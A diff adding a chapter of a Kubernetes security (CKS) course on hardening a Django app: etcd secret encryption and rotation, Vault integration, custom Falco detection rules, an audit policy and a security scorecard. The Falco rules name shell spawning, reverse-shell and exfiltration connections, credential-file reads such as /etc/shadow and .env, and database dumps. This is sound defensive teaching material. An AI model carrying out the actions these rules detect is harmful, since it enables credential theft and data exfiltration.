+                    <div class="step"><span class="step-number">3</span><strong>Verify encryption is working</strong><p>Create a test secret: <code>kubectl create secret generic test-encryption --from-literal=key=value -n anihpj-prod</code>. Then check etcd directly: <code>ETCDCTL_API=3 etcdctl get /registry/secrets/anihpj-prod/test-encryption | hexdump -C</code>. The output should show encrypted (garbled) data, NOT the plaintext "value".</p></div>
+                    <div class="step"><span class="step-number">4</span><strong>Rotate all existing secrets</strong><p>Existing secrets are still in plaintext! Run: <code>kubectl get secrets -A -o json | kubectl replace -f -</code>. This reads every secret (decrypted by API server) and writes it back (encrypted with new key).</p></div>
+                    <div class="step"><span class="step-number">5</span><strong>Verify rotation</strong><p>Check etcd again. Previously-plaintext secrets should now be encrypted. Run: <code>kubectl get secret anihpj-secrets -n anihpj-prod -o jsonpath='{.data}'</code> to confirm the API server still returns decrypted data.</p></div>
+                </div>
+
+                <h4>HashiCorp Vault Integration — External Secrets for Django</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">Bash — Vault setup: Store Django SECRET_KEY externally, inject via CSI driver</span>
+                    </div>
+                    <pre><code class="language-bash"># 1. Store the Django SECRET_KEY in Vault
+vault kv put secret/anihpj/prod \
+  django-secret-key="django-insecure-$(openssl rand -base64 48)" \
+  db-password="$(openssl rand -base64 32)" \
+  redis-password="$(openssl rand -base64 24)"
+
+# 2. Configure Vault Kubernetes auth (allows pods to authenticate)
+vault auth enable kubernetes
+vault write auth/kubernetes/config \
+  kubernetes_host="https://kubernetes.default.svc"
+
+# 3. Create a policy allowing anihpj to read its secrets
+vault policy write anihpj-policy - &lt;&lt;EOF
+path "secret/data/anihpj/prod" {
+  capabilities = ["read"]
+}
+EOF
+
+# 4. Create a Vault role binding the anihpj SA to the policy
+vault write auth/kubernetes/role/anihpj \
+  bound_service_account_names=anihpj-sa \
+  bound_service_account_namespaces=anihpj-prod \
+  policies=anihpj-policy \
+  ttl=1h</code></pre>
+                </div>
+            </div>
+
+            <!-- ═══════════ SECTION 33.8 ═══════════ -->
+            <div class="section-block" id="s33-8">
+                <h3>33.8 Step 7 — Runtime Monitoring</h3>
+                <p>Hardening prevents attacks. <strong>Runtime monitoring detects them</strong> when prevention fails. Custom Falco rules watch for Django-specific threats, and audit logging captures every API interaction for forensic analysis.</p>
+
+                <h4>Custom Falco Rules for anihpj</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — Falco custom rules: Detect Django-specific attack patterns</span>
+                    </div>
+                    <pre><code class="language-yaml"># /etc/falco/falco_rules.local.yaml
+# Custom rules for anihpj Django application
+
+# Rule 1: Alert on ANY shell spawned in anihpj container
+- rule: Shell in anihpj container
+  desc: "A shell was spawned inside an anihpj container. This is suspicious — Django apps should never need shells at runtime."
+  condition: >
+    spawned_process
+    and container.name startswith "anihpj"
+    and shell_procs
+    and proc.name in (bash, sh, zsh, dash)
+  output: >
+    🚨 SHELL in anihpj! user=%user.name pod=%pod.name container=%container.name
+    command=%proc.cmdline
+  priority: CRITICAL
+  tags: [anihpj, runtime, shell]
+
+# Rule 2: Alert on unexpected network connections FROM anihpj
+- rule: Unexpected outbound connection from anihpj
+  desc: "anihpj pod initiated connection to an external IP. Check for data exfiltration or reverse shell."
+  condition: >
+    outbound
+    and container.name startswith "anihpj"
+    and not fd.sip.name in (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
+  output: >
+    🌐 EXTERNAL connection from anihpj! pod=%pod.name dest=%fd.sip:%fd.sport
+    command=%proc.cmdline
+  priority: WARNING
+  tags: [anihpj, network, exfiltration]
+
+# Rule 3: Alert on secret file access in anihpj container
+- rule: Sensitive file access in anihpj
+  desc: "anihpj container accessed sensitive files. Possible credential theft."
+  condition: >
+    open_read
+    and container.name startswith "anihpj"
+    and (fd.name contains "/etc/shadow"
+         or fd.name contains "/etc/passwd"
+         or fd.name contains "/root/.bash_history"
+         or fd.name contains "/app/.env")
+  output: >
+    🔑 SENSITIVE FILE ACCESS in anihpj! pod=%pod.name file=%fd.name
+  priority: WARNING
+  tags: [anihpj, filesystem, credential-theft]
+
+# Rule 4: Alert on database dump attempt
+- rule: Database dump from anihpj
+  desc: "pg_dump or mysqldump executed in anihpj container — possible data exfiltration."
+  condition: >
+    spawned_process
+    and container.name startswith "anihpj"
+    and proc.name in (pg_dump, pg_dumpall, mysqldump)
+  output: >
+    💾 DATABASE DUMP from anihpj! pod=%pod.name command=%proc.cmdline
+  priority: CRITICAL
+  tags: [anihpj, database, exfiltration]</code></pre>
+                </div>
+
+                <h4>Audit Policy — Log Secret Access and Pod Exec</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — Audit policy: Log security-critical API operations</span>
+                    </div>
+                    <pre><code class="language-yaml"># /etc/kubernetes/audit-policy.yaml
+apiVersion: audit.k8s.io/v1
+kind: Policy
+rules:
+# Log ALL secret access at Metadata level (who read which secret, when)
+- level: Metadata
+  resources:
+  - group: ""
+    resources: ["secrets"]
+
+# Log ALL ConfigMap access (may contain sensitive config)
+- level: Metadata
+  resources:
+  - group: ""
+    resources: ["configmaps"]
+
+# Log pod exec (shell access) at RequestResponse level (full request + response)
+- level: RequestResponse
+  verbs: ["create"]
+  resources:
+  - group: ""
+    resources: ["pods/exec"]
+
+# Log RBAC changes (ClusterRole/RoleBinding creates and deletes)
+- level: RequestResponse
+  verbs: ["create", "update", "delete"]
+  resources:
+  - group: "rbac.authorization.k8s.io"
+    resources: ["clusterroles", "clusterrolebindings", "roles", "rolebindings"]
+
+# Log NetworkPolicy changes
+- level: RequestResponse
+  verbs: ["create", "update", "delete"]
+  resources:
+  - group: "networking.k8s.io"
+    resources: ["networkpolicies"]
+
+# Don't log read-only operations (get, list, watch) to avoid noise
+- level: None
+  verbs: ["get", "list", "watch"]
+  resources:
+  - group: ""
+    resources: ["pods", "services", "endpoints", "nodes"]</code></pre>
+                </div>
+            </div>
+
+            <!-- ═══════════ SECTION 33.9 ═══════════ -->
+            <div class="section-block" id="s33-9">
+                <h3>33.9 Comparing Before and After — The Security Scorecard</h3>
+                <p>Let's measure the impact of each hardening step. The following scorecard compares anihpj's security posture across <strong>13 dimensions</strong> before and after applying all CKS controls:</p>
+
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th style="width:30%;">Security Property</th><th style="width:35%;">Before Hardening</th><th style="width:35%;">After Hardening</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>Image CVEs (CRITICAL)</strong></td><td>🔴 2 CRITICAL CVEs</td><td>🟢 0 CRITICAL CVEs</td></tr>
+                            <tr><td><strong>Image signing</strong></td><td>🔴 Not signed — anyone can push</td><td>🟢 Signed with cosign + Kyverno verified</td></tr>
+                            <tr><td><strong>Image tag</strong></td><td>🔴 <code>:latest</code> (mutable)</td><td>🟢 SHA256 digest (immutable)</td></tr>
+                            <tr><td><strong>Runs as non-root</strong></td><td>🔴 Root (UID 0) — full system access</td><td>🟢 UID 1000 — unprivileged user</td></tr>
+                            <tr><td><strong>Read-only filesystem</strong></td><td>🔴 Writable — attacker can persist</td><td>🟢 Read-only — malware blocked</td></tr>
+                            <tr><td><strong>Capabilities</strong></td><td>🔴 Default 14 Linux capabilities</td><td>🟢 Drop ALL — zero capabilities</td></tr>
+                            <tr><td><strong>Privilege escalation</strong></td><td>🔴 Allowed — setuid works</td><td>🟢 Blocked — no privilege gain</td></tr>
+                            <tr><td><strong>Seccomp</strong></td><td>🔴 Unconfined — all syscalls allowed</td><td>🟢 RuntimeDefault — ~300 blocked</td></tr>
+                            <tr><td><strong>AppArmor</strong></td><td>🔴 None — no kernel restrictions</td><td>🟢 Custom profile — file + network only</td></tr>
+                            <tr><td><strong>Pod Security Standard</strong></td><td>🔴 None enforced — anything goes</td><td>🟢 PSS Restricted enforced</td></tr>
+                            <tr><td><strong>RBAC</strong></td><td>🔴 Default SA with cluster permissions</td><td>🟢 Least privilege — dedicated SAs</td></tr>
+                            <tr><td><strong>NetworkPolicy</strong></td><td>🔴 None — all pods communicate freely</td><td>🟢 Default deny + 5 explicit allow rules</td></tr>
+                            <tr><td><strong>Secrets encryption</strong></td><td>🔴 Plaintext in etcd</td><td>🟢 AES-CBC encrypted at rest</td></tr>
+                            <tr><td><strong>Audit logging</strong></td><td>🔴 Disabled — zero visibility</td><td>🟢 Full audit policy — secrets + exec logged</td></tr>
+                            <tr><td><strong>Runtime monitoring</strong></td><td>🔴 None — blind to attacks</td><td>🟢 Falco with 4 custom anihpj rules</td></tr>
+                            <tr><td><strong>Resource limits</strong></td><td>🔴 None — can DoS the node</td><td>🟢 CPU + memory limits set</td></tr>
+                            <tr><td style="font-size:1.2rem;font-weight:700;">kubesec score</td><td style="font-size:1.2rem;color:#dc2626;font-weight:700;">2 / 10</td><td style="font-size:1.2rem;color:#4ade80;font-weight:700;">8 / 10</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Security Improvement Visualization — Before vs After</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Radar Chart: Security Dimension Coverage (0=absent, 10=fully hardened)</div>
+<pre>
+                    Image Security (10)
+                         ▲
+                        /|\
+                       / | \
+                      /  |  \
+         Runtime ────/───┼───\──── Pod Security
+         Monitor    /    |    \
+         (10)      |     |     |  (10)
+                   |     |     |
+                   |  0--5--10 |
+                   |     |     |
+         Secrets ──┼─────┼─────┼── Network
+         Encrypt   |     |     |  Policy
+         (10)      |     |     |  (10)
+                    \    |    /
+                     \   |   /
+                      \  |  /
+                       \ | /
+                         ▼
+                   RBAC (10)
+
+    BEFORE: ░░░░░░░░░░ (thin coverage across all dimensions)
+    AFTER:  ██████████ (full coverage — Level 2 CKS standard)
+</pre>
+                </div>
+            </div>
+
+            <!-- ═══════════ VISUAL SUMMARY ═══════════ -->
+            <div class="visual-summary">
+                <h4>📊 Chapter 33 Visual Summary — anihpj Hardening at a Glance</h4>
+                <div class="card-grid cols-4">
+                    <div class="info-card"><div class="card-icon-lg">🔍</div><h5>Baseline (33.1)</h5><p>kubesec 2/10, 2 CRITICAL CVEs, root containers, no NetworkPolicy. 6 attack vectors identified.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">📦</div><h5>Supply Chain (33.2)</h5><p>Multi-stage Dockerfile, .dockerignore, Trivy CI gate, cosign keyless signing, SBOM generation.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">🛡️</div><h5>Pod Security (33.3)</h5><p>Non-root UID 1000, read-only FS, drop ALL caps, Seccomp, AppArmor profile, secret references.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">🚪</div><h5>Admission (33.4)</h5><p>PSS Restricted labels, Kyverno verifyImages, Gatekeeper approved registries. Defense in depth.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">🔑</div><h5>RBAC (33.5)</h5><p>Dedicated SAs, disabled automount, CI/CD update-only role, monitoring read-only. Least privilege verified.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">🌐</div><h5>Network (33.6)</h5><p>Default deny + 5 allow rules: ingress, postgres, redis, DNS, monitoring. Microsegmentation achieved.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">🔐</div><h5>Secrets (33.7)</h5><p>AES-CBC encryption at rest, secret rotation, Vault integration for external secret management.</p></div>
+                    <div class="info-card"><div class="card-icon-lg">👁️</div><h5>Runtime (33.8)</h5><p>4 custom Falco rules, audit policy for secrets + exec + RBAC. Full visibility into runtime threats.</p></div>
+                </div>
+            </div>
+
+            <!-- ═══════════ CHAPTER NAVIGATION ═══════════ -->
+            <div class="chapter-nav-row">
+                <a href="#ch32" class="chapter-nav-link prev">← Chapter 32: Compliance &amp; Continuous Monitoring</a>
+                <a href="#ch34" class="chapter-nav-link next">Chapter 34: Incident Response Simulation →</a>
+            </div>
+        </div><div id="ch34"><div class="content-placeholder"><div class="placeholder-icon">🎭</div><p>Chapter 34: Incident Response Simulation — Content coming soon</p></div></div><div id="ch35"><div class="content-placeholder"><div class="placeholder-icon">⚡</div><p>Chapter 35: Security Automation &amp; GitOps — Content coming soon</p></div></div></section>
         <div class="part-header-banner">
             <div class="part-label">Part 9 of 9 · Exam Readiness</div>
             <div class="part-title">CKS Exam Preparation — Strategy, Practice, Review</div>
